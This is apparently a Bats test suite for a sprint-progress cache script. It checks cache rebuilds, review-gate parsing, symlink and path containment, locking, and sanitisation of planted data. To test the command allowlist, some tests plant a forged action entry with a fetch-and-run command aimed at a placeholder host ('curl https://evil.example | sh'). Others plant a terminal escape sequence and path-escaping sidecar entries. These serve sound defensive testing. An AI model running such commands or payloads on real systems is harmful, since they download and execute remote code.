@test "a different sprint-status path is detected and rebuilt" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.sprint.id' "$CACHE")" = "sprint-test" ]

  local other="$PROJECT_ROOT/.gaia/state/other-status.yaml"
  sed 's/^sprint_id: "sprint-test"/sprint_id: "sprint-other"/' "$SPRINT_STATUS_YAML" > "$other"
  touch -r "$SPRINT_STATUS_YAML" "$other"
  SPRINT_STATUS_YAML="$other" run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.sprint.id' "$CACHE")" = "sprint-other" ]
}

@test "sidecar stores project-relative paths only" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(grep -c '^story' "$SIDECAR")" = "1" ]
  # No absolute path and no home/tmp layout leaks into the sidecar.
  run awk -F'\t' '($1 == "story" || $1 == "meta") && $3 ~ /^\// { print }' "$SIDECAR"
  [ -z "$output" ]
  run grep -c "$TEST_TMP" "$SIDECAR"
  [ "$output" = "0" ]
}

# ---------------------------------------------------------------------------
# Review-gate rows
# ---------------------------------------------------------------------------

@test "gate rows keep only the six canonical gates, once each, and total is always 6" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5" "E900-S2:review:5"
  # S1: all six canonical gates PASSED, plus an extra row and a repeated row.
  printf -- '---\ntitle: "S1"\nstatus: review\nmanual_verification: true\n---\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review | PASSED | — |\n| QA Tests | PASSED | — |\n| Extra Gate | PASSED | — |\n| Security Review | PASSED | — |\n| Test Automation | PASSED | — |\n| Test Review | PASSED | — |\n| Performance Review | PASSED | — |\n| Code Review | FAILED | — |\n' \
    | write_raw_story E900-S1 E900-S1-rows >/dev/null
  # S2: three canonical gates PASSED and three look-alike rows PASSED.
  printf -- '---\ntitle: "S2"\nstatus: review\nmanual_verification: true\n---\n\n## Review Gate\n\n| Review | Status | Report |\n|--------|--------|--------|\n| Code Review | PASSED | — |\n| QA Tests | PASSED | — |\n| Security Review | PASSED | — |\n| Code review | PASSED | — |\n| Perf Review | PASSED | — |\n| Tests | PASSED | — |\n' \
    | write_raw_story E900-S2 E900-S2-rows >/dev/null

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  local s1='.stories[] | select(.key == "E900-S1")' s2='.stories[] | select(.key == "E900-S2")'
  [ "$(jq -c "[$s1 | .gates.rows[] | [.name, .status]]" "$CACHE")" = '[["Code Review","PASSED"],["QA Tests","PASSED"],["Security Review","PASSED"],["Test Automation","PASSED"],["Test Review","PASSED"],["Performance Review","PASSED"]]' ]
  [ "$(jq -c "$s1 | .gates | [.passed, .total]" "$CACHE")" = '[6,6]' ]
  [ "$(jq -c "[$s2 | .gates.rows[].name]" "$CACHE")" = '["Code Review","QA Tests","Security Review"]' ]
  [ "$(jq -c "$s2 | .gates | [.passed, .total]" "$CACHE")" = '[3,6]' ]
  # Only the story whose six real gates passed is due a manual test.
  [ "$(jq -c '[.action_needed[] | select(.rule == "a") | .story_keys[0]]' "$CACHE")" = '["E900-S1"]' ]
}

# ---------------------------------------------------------------------------
# Story tree changes while the yaml is unchanged
# ---------------------------------------------------------------------------

@test "a duplicate story file that appears after its key was resolved is reported as ambiguous" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local sf; sf="$(write_story E900-S1 in-progress 5)"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  expect_warm_next

  # A second directory for the same key appears next to the first one; the
  # yaml and the first story file are untouched.
  mkdir -p "$IMPL/epic-test/E900-S1-dup"
  cp -p "$sf" "$IMPL/epic-test/E900-S1-dup/story.md"
  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 0 ]
  grep -q 'multiple files match key E900-S1' <<< "$stderr"
  [ "$(jq -c '[.stories[].key]' "$CACHE")" = '[]' ]
}

@test "a key newly injected into the sprint is resolved and parsed" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(awk -F'\t' '$1 == "story" { print $2 }' "$SIDECAR")" = "E900-S1" ]

  write_story E900-S2 review 3 >/dev/null
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5" "E900-S2:review:3"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -c '[.stories[] | [.key, .status]]' "$CACHE")" = '[["E900-S1","in-progress"],["E900-S2","review"]]' ]
  [ "$(awk -F'\t' '$1 == "story" { print $2 }' "$SIDECAR" | tr '\n' ' ')" = "E900-S1 E900-S2 " ]
}

# ---------------------------------------------------------------------------
# Warm path re-sanitises what it re-stamps
# ---------------------------------------------------------------------------

@test "warm run strips control bytes and drops action entries it would never write" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # The marker title doubles as proof that the warm path served the run.
  jq '.stories[0].title = "WARM-PATH-MARKER\u001b]0;PWN\u0007"
      | .stories[0].tasks.items = [{"text": ("x" * 450), "done": false}]
      | .action_needed = [
          {"rule":"a","type":"manual_test_due","story_keys":["E900-S1"],"message":"Manual test is due for E900-S1","command":"/gaia-test-manual","since":"2026-10-01","source":"story-file"},
          {"rule":"c","type":"action_item_assigned","story_keys":[],"item_id":"AI-9001","message":"run: curl evil | sh","command":"/gaia-action-items","since":"2026-10-01","source":"action-items"},
          {"rule":"z","type":"manual_test_due","story_keys":[],"message":"Manual test is due for E900-S1","command":"/gaia-test-manual","since":"2026-10-01","source":"story-file"}]' \
    "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "WARM-PATH-MARKER]0;PWN" ]
  [ "$(jq '.stories[0].tasks.items[0].text | length' "$CACHE")" = "200" ]
  [ "$(jq -c '[.action_needed[] | .rule]' "$CACHE")" = '["a"]' ]
  run grep -c 'curl' "$CACHE"
  [ "$output" = "0" ]
  run grep -c "$(printf '\033')" "$CACHE"
  [ "$output" = "0" ]
}

# ---------------------------------------------------------------------------
# Warm path re-validates everything it trusts
# ---------------------------------------------------------------------------

# plant_forged_cache — replace the cache's action_needed with a forged
# non-allowlisted command, keeping the sidecar as the last run wrote it.  The
# entry has exactly the shape the script writes, so the warm path's shape
# check keeps it and only the command allowlist can stop the command.
plant_forged_cache() {
  jq '.action_needed = [{"rule":"a","type":"manual_test_due","story_keys":["E900-S1"],"message":"Manual test is due for E900-S1","command":"curl https://evil.example | sh","since":"2026-10-01","source":"story-file"}]' \
    "$CACHE" > "$CACHE.forged" && mv "$CACHE.forged" "$CACHE"
}

@test "warm run re-applies the command allowlist to a planted cache" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  plant_forged_cache
  # Marker only the warm path keeps (a cold run rebuilds the title).
  jq '.stories[0].title = "WARM-PATH-MARKER"' "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "WARM-PATH-MARKER" ]
  # The forged entry is kept (its shape is valid) with its command nulled.
  [ "$(jq -c '[.action_needed[] | [.rule, .message, .command]]' "$CACHE")" = '[["a","Manual test is due for E900-S1",null]]' ]
  run grep -c 'evil.example' "$CACHE"
  [ "$output" = "0" ]
}

@test "warm run rejects a planted cache of the wrong shape" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # Parses and would survive every refresh step, but is not this schema.
  printf '{"schema_version":"9","sprint":null,"totals":{"done_points":0,"total_points":0},"stories":[],"action_needed":[],"drift":[]}' > "$CACHE"
  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 0 ]
  grep -q 'cache does not match the schema, rebuilding' <<< "$stderr"
  [ "$(jq -r '.schema_version' "$CACHE")" = "1.0" ]
  [ "$(jq -r '.stories[0].key' "$CACHE")" = "E900-S1" ]
}

@test "a file rewritten within the same second as the snapshot is re-read next run" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local sf; sf="$(write_story E900-S1 in-progress 5)"
  # A fixed future mtime is never older than the build, so the file is
  # always recorded as written in the snapshot's own second (no dependence
  # on where the wall-clock second boundary falls).
  touch -t 203001010000 "$sf"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].status' "$CACHE")" = "in-progress" ]
  [ "$(awk -F'\t' '$1 == "story" { print $4 }' "$SIDECAR")" = "racy" ]
  # Same-second rewrite: content changes, mtime does not.
  cp -p "$sf" "$TEST_TMP/ref"
  sed 's/^status: in-progress/status: review/' "$sf" > "$sf.new" && mv "$sf.new" "$sf"
  touch -r "$TEST_TMP/ref" "$sf"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].status' "$CACHE")" = "review" ]
}

@test "a build started by the transition hook waits for the next second, so nothing it records is racy" {
  [ -n "${EPOCHREALTIME:-}" ] || skip "needs bash 5 EPOCHREALTIME to align to a second boundary"
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local sf; sf="$(write_story E900-S1 in-progress 5)"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # Start just after a second boundary and change the story in that second,
  # the way a transition does right before its hook starts the snapshot.
  local s0="$EPOCHSECONDS"
  while [ "$EPOCHSECONDS" = "$s0" ]; do sleep 0.01; done
  sed 's/^status: in-progress/status: review/' "$sf" > "$sf.new" && mv "$sf.new" "$sf"
  GAIA_SNAPSHOT_HOOK_ACTIVE=1 run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].status' "$CACHE")" = "review" ]
  expect_warm_next
}

# plant_story_entry PATH MTIME — rewrite the story entry of the sidecar the
# last run wrote with PATH and MTIME.  The format header, the story-tree
# entries and the meta entries stay exactly as the script wrote them, so the
# planted path is the only thing that can send the run cold.
plant_story_entry() {
  awk -F'\t' -v OFS='\t' -v p="$1" -v m="$2" '$1 == "story" { $3 = p; $4 = m } { print }' \
    "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
}

# warm_baseline — one story, a cold run, and proof the untouched sidecar is
# served warm (so a later cold run is caused by what the test plants).
warm_baseline() {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(head -1 "$SIDECAR")" = "v4" ]
  expect_warm_next
}

# expect_cold_because REASON — plant a title only a warm run keeps, run, and
# require a cold rebuild that names REASON on stderr.
expect_cold_because() {
  jq '.stories[0].title = "PLANTED"' "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "Story E900-S1" ]
  grep -qF "sidecar $1, rebuilding" <<< "$stderr" || { echo "stderr was: $stderr" >&2; return 1; }
}

@test "planted sidecar pointing outside the project falls back to a cold run" {
  warm_baseline
  plant_forged_cache
  # Tracked path outside the root with its real mtime: an absolute path and
  # a parent-escaping relative path.  Both are refused as not
  # project-relative before anything is resolved.
  local outside="$TEST_TMP/outside.md"; echo x > "$outside"
  local mt; mt="$(_stat_mtime "$outside")"
  plant_story_entry "$outside" "$mt"
  expect_cold_because "story path for E900-S1 is not project-relative"
  [ "$(jq -r '.action_needed[] | .command' "$CACHE" | grep -c evil)" = "0" ]
  [ "$(jq -r '.stories[0].key' "$CACHE")" = "E900-S1" ]

  plant_forged_cache
  # ../outside.md from the project root is the same outside file.
  [ -f "$PROJECT_ROOT/../outside.md" ]
  plant_story_entry "../outside.md" "$mt"
  expect_cold_because "story path for E900-S1 is not project-relative"
  [ "$(jq -r '.action_needed[] | .command' "$CACHE" | grep -c evil)" = "0" ]
}

@test "sidecar without a sprint-status entry falls back to a cold run" {
  warm_baseline
  grep -v '__sprint_status__' "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
  expect_cold_because "has no entry for __sprint_status__"
}

@test "sidecar story path behind a symlink chain out of the root falls back to a cold run" {
  warm_baseline
  # In-root link -> in-root link -> outside file.  The relative path is
  # well formed, so only the containment check can refuse it.
  local outside="$TEST_TMP/outside-secret.md"; echo secret > "$outside"
  ln -s "$outside" "$PROJECT_ROOT/.gaia/state/hop2"
  ln -s hop2 "$PROJECT_ROOT/.gaia/state/hop1"
  local mt; mt="$(_stat_mtime "$outside")"
  plant_story_entry ".gaia/state/hop1" "$mt"
  expect_cold_because "story path for E900-S1 resolves outside the project root"
}

@test "a sidecar in an older format or with no format line forces a cold run" {
  warm_baseline
  # Same entries, older header.
  sed '1s/^v4$/v3/' "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
  [ "$(head -1 "$SIDECAR")" = "v3" ]
  expect_cold_because "format is out of date"

  # Same entries, no header at all: every other entry is valid, so only the
  # format check stands between this sidecar and the warm path.
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  expect_warm_next
  sed '1d' "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
  ! grep -q '^v' "$SIDECAR" || false
  expect_cold_because "format is out of date"
}

@test "a sidecar with no story-tree entry forces a cold run" {
  warm_baseline
  awk -F'\t' '$1 != "dir"' "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
  [ "$(grep -c '^dir' "$SIDECAR")" = "0" ]
  expect_cold_because "has no story-tree entry"
}

@test "story-tree directories with control bytes in their names never reach the sidecar" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  mkdir -p "$IMPL/epic"$'\t'"tab" "$IMPL/epic"$'\n'"lf" "$IMPL/epic"$'\r'"cr" "$IMPL/epic"$'\037'"us"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # Every line is one well-formed entry: no line was split or shifted.
  [ "$(grep -cvE '^(v4|story	|link	|dir	|meta	|miss	)' "$SIDECAR")" = "0" ]
  [ "$(awk -F'\t' '$1 == "dir" && (NF != 3 || $3 !~ /^[0-9]+$/ || $2 ~ /[\r\037]/)' "$SIDECAR" | wc -l | tr -d ' ')" = "0" ]
  # The clean directories are all recorded.
  [ "$(grep -c '^dir	' "$SIDECAR")" = "2" ]
  expect_warm_next
}

@test "a planted story-tree entry with a control byte sends the run cold" {
  warm_baseline
  local d="$IMPL/cr"$'\r'"dir"; mkdir -p "$d"
  # Same mtime as everything else, so the story-tree root still matches.
  touch -t 202610010000 "$d" "$IMPL"
  local mt; mt="$(_stat_mtime "$d")"
  printf 'dir\t%s\t%s\n' ".gaia/artifacts/implementation-artifacts/cr"$'\r'"dir" "$mt" >> "$SIDECAR"
  expect_cold_because "has a story-tree entry with control characters"
}

@test "a story symlink pointed at another file is noticed on the warm path" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  # The targets live in the story tree, so a cold run can reuse a cached
  # target path directly (and must still keep the link entry).
  local shared="$IMPL/shared-notes"
  mkdir -p "$shared" "$IMPL/epic-test/E900-S1-linked"
  printf -- '---\nkey: "E900-S1"\ntitle: "TARGET-A"\nstatus: in-progress\npoints: 5\n---\n' > "$shared/a.md"
  printf -- '---\nkey: "E900-S1"\ntitle: "TARGET-B"\nstatus: review\npoints: 5\n---\n' > "$shared/b.md"
  local link="$IMPL/epic-test/E900-S1-linked/story.md"
  ln -s "$shared/a.md" "$link"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "TARGET-A" ]
  grep -q "^link	E900-S1	.gaia/artifacts/implementation-artifacts/epic-test/E900-S1-linked/story.md$" "$SIDECAR"

  # The story file changed but the yaml and the story tree did not: the cold
  # run reuses the cached story path, and still records the link.
  touch -t 202610020000 "$shared/a.md"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  grep -q "^link	E900-S1	" "$SIDECAR"
  expect_warm_next

  # Point the link at the other file.  Both targets carry the same mtime and
  # the story directories are untouched: only the link entry tells.
  touch -r "$shared/a.md" "$shared/b.md"
  rm -f "$link"; ln -s "$shared/b.md" "$link"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -c '[.stories[0].title, .stories[0].status]' "$CACHE")" = '["TARGET-B","review"]' ]
}

@test "a story file replaced by a link to another file is noticed on the warm path" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local sf; sf="$(write_story E900-S1 in-progress 5)"
  mkdir -p "$PROJECT_ROOT/shared"
  printf -- '---\nkey: "E900-S1"\ntitle: "TARGET-C"\nstatus: review\npoints: 5\n---\n' > "$PROJECT_ROOT/shared/c.md"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  expect_warm_next
  rm -f "$sf"; ln -s "$PROJECT_ROOT/shared/c.md" "$sf"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -c '[.stories[0].title, .stories[0].status]' "$CACHE")" = '["TARGET-C","review"]' ]
}

# linked_baseline — one story reached through a symlink to a file in the
# story tree, built cold and confirmed warm.
linked_baseline() {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  mkdir -p "$IMPL/shared-notes" "$IMPL/epic-test/E900-S1-linked"
  printf -- '---\nkey: "E900-S1"\ntitle: "Story E900-S1"\nstatus: in-progress\npoints: 5\n---\n' > "$IMPL/shared-notes/a.md"
  ln -s "$IMPL/shared-notes/a.md" "$IMPL/epic-test/E900-S1-linked/story.md"
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(grep -c '^story	E900-S1	' "$SIDECAR")" = "1" ]
  [ "$(grep -c '^link	E900-S1	' "$SIDECAR")" = "1" ]
  expect_warm_next
}

# edit_sidecar AWK — rewrite the sidecar through an awk program (tab fields).
edit_sidecar() {
  awk -F'\t' -v OFS='\t' "$1" "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
}

@test "a sidecar link row whose story has no story row sends the run cold" {
  linked_baseline
  edit_sidecar '$1 != "story"'
  [ "$(grep -c '^story	' "$SIDECAR")" = "0" ]
  [ "$(grep -c '^link	E900-S1	' "$SIDECAR")" = "1" ]
  jq '.stories[0].title = "PLANTED"' "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "Story E900-S1" ]
  [ "$(grep -c '^story	E900-S1	' "$SIDECAR")" = "1" ]
}

@test "a sidecar link row with an invalid story key sends the run cold" {
  linked_baseline
  edit_sidecar '$1 == "link" { $2 = "E900-S1x" } { print }'
  expect_cold_because "has an invalid story key"
}

@test "a sidecar story row with an invalid story key sends the run cold" {
  # Without a link, so nothing but the key check refuses the row.
  warm_baseline
  edit_sidecar '$1 == "story" { $2 = "E900-S1x" } { print }'
  [ "$(grep -c '^story	E900-S1x	' "$SIDECAR")" = "1" ]
  expect_cold_because "has an invalid story key"
  # The same with a link: the story row is refused for its key before the
  # link is compared with it.
  rm -rf "$IMPL/epic-test" "$CACHE" "$SIDECAR"
  linked_baseline
  edit_sidecar '$1 == "story" { $2 = "E900-S1x" } { print }'
  expect_cold_because "has an invalid story key"
}

# ---------------------------------------------------------------------------
# Layout overrides
# ---------------------------------------------------------------------------

@test "IMPLEMENTATION_ARTIFACTS override and legacy docs layout are honoured" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  # Legacy layout: no .gaia/artifacts tree, stories under docs/.
  rm -rf "$PROJECT_ROOT/.gaia/artifacts"
  IMPL="$PROJECT_ROOT/docs/implementation-artifacts"
  write_story E900-S1 in-progress 5 >/dev/null
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.stories | length' "$CACHE")" = "1" ]

  # Explicit override wins.
  local alt="$PROJECT_ROOT/alt-impl"
  IMPL="$alt"
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S2:in-progress:5"
  write_story E900-S2 in-progress 5 >/dev/null
  IMPLEMENTATION_ARTIFACTS="$alt" run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].key' "$CACHE")" = "E900-S2" ]
}

@test "REVIEW_GATE_LEDGER override is honoured inside the project root" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  write_story_with_gates E900-S1 review 5 true >/dev/null
  local alt="$PROJECT_ROOT/alt-ledger"
  printf 'E900-S1\tmanual-test\tplan-1\tPASSED\n' > "$alt"
  REVIEW_GATE_LEDGER="$alt" run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = "PASSED" ]
}

# ---------------------------------------------------------------------------
# Missing-input warnings
# ---------------------------------------------------------------------------

@test "missing story file, missing gate table and multi-match key warn on stderr" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:in-progress:5" "E900-S2:in-progress:5" "E900-S3:in-progress:5"
  printf -- '---\nkey: "E900-S1"\ntitle: "T"\nstatus: in-progress\npoints: 5\n---\n' \
    | write_raw_story E900-S1 E900-S1-nogate >/dev/null
  # E900-S2 has no file.  E900-S3 has two equal-precedence matches.
  write_story E900-S3 in-progress 5 >/dev/null
  mkdir -p "$IMPL/epic-other/E900-S3-dup"
  cp "$IMPL/epic-test/E900-S3-e900-s3-test-story/story.md" "$IMPL/epic-other/E900-S3-dup/story.md"

  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 0 ]
  grep -q 'no parseable Review Gate table for E900-S1' <<< "$stderr"
  grep -q 'no file found for key E900-S2' <<< "$stderr"
  grep -q 'multiple files match key E900-S3' <<< "$stderr"
  [ "$(jq -c '[.stories[].key]' "$CACHE")" = '["E900-S1"]' ]
}

# ---------------------------------------------------------------------------
# Lost update while a snapshot holds the lock
# ---------------------------------------------------------------------------

@test "a change committed while a snapshot is building triggers one more build" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local sf; sf="$(write_story E900-S1 in-progress 5)"

  # Stub jq: on the FIRST cold assembly, simulate a concurrent transition —
  # change the story, then leave the re-run marker the way a skipped
  # concurrent snapshot run would.
  local stub="$TEST_TMP/stub-bin"; mkdir -p "$stub"
  local real_jq; real_jq="$(command -v jq)"
  local marker="$PROJECT_ROOT/.gaia/state/.sprint-progress-cache.json.lock.dirty"
  cat > "$stub/jq" <<SH
#!/usr/bin/env bash
case "\$*" in
  *'inputs | split'*)
    if [ ! -e "$TEST_TMP/stub-fired" ]; then
      : > "$TEST_TMP/stub-fired"
      sed 's/^status: in-progress/status: review/' "$sf" > "$sf.new" && mv "$sf.new" "$sf"
      touch -t 203001010000 "$sf"
      mkdir "$marker"
    fi
    echo build >> "$TEST_TMP/builds" ;;
esac
exec "$real_jq" "\$@"
SH
  chmod +x "$stub/jq"

  PATH="$stub:$PATH" run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(wc -l < "$TEST_TMP/builds" | tr -d ' ')" = "2" ]
  [ "$(jq -r '.stories[0].status' "$CACHE")" = "review" ]
  [ ! -e "$marker" ]
}

@test "a run refused the lock by a live holder leaves the re-run marker, and the next run clears it" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5 >/dev/null
  local lock="$PROJECT_ROOT/.gaia/state/.sprint-progress-cache.json.lock"
  local marker="$lock.dirty"
  local backends="fallback" backend
  if command -v flock >/dev/null 2>&1; then backends="fallback flock"; fi

  for backend in $backends; do
    local force=""
    if [ "$backend" = "fallback" ]; then force=1; fi
    rm -rf "$CACHE" "$marker"

    # This test process holds the lock: a live PID that took it just now.
    printf '%s %s\n' "$$" "$(date +%s)" > "$lock"
    GAIA_LOCK_FORCE_FALLBACK="$force" run --separate-stderr "$SCRIPT"
    [ "$status" -eq 0 ]
    grep -q "lock not taken (held by live process $$), skipping" <<< "$stderr"
    # The refused run asked the holder for one more build ...
    [ -d "$marker" ]
    [ ! -L "$marker" ]
    # ... and built nothing itself.
    [ ! -e "$CACHE" ]

    # The holder releases; the next run builds and clears the marker.
    rm -f "$lock"
    GAIA_LOCK_FORCE_FALLBACK="$force" run --separate-stderr "$SCRIPT"
    [ "$status" -eq 0 ]
    if grep -q 'lock not taken' <<< "$stderr"; then return 1; fi
    [ "$(jq -r '.stories[0].key' "$CACHE")" = "E900-S1" ]
    [ ! -e "$marker" ]
    [ ! -e "$lock" ]
  done
}
